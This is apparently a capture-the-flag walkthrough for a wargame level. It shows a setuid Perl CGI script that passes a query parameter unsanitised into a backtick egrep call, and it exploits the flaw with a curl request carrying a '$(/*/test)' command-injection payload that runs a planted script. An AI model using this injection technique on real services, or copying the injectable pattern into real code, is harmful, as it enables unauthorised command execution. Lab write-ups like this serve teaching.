# Level12
## Step by step
### 1. Access the `level12` Home Directory
  ```bash
  > ls
  -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
  ```

---
### 2. Understanding the `level12` Program

The `level12.pl` file contains a Perl script that listens on `localhost:4646` and takes two query strings: `x` and `y`.
  ```bash
  > cat level12.pl 
  #!/usr/bin/env perl
  # localhost:4646
  use CGI qw{param};
  print "Content-type: text/html\n\n";
  
  sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
  }
  
  sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
  }
  
  n(t(param("x"), param("y")));
  ```
This script performs some manipulation and executes a command using egrep to search /tmp/xd

---
### 3. Exploiting the Script

The goal is to execute a command via egrep within this script.
  ```bash
  > cat <<hey >/tmp/TEST
  > #!/bin/bash
  > getflag > /tmp/flag
  > hey

  > chmod +x /tmp/TEST

  > curl localhost:4646?x='$(/*/test)'

  > cat /tmp/flag
  Check flag.Here is your token : XXX
  ```
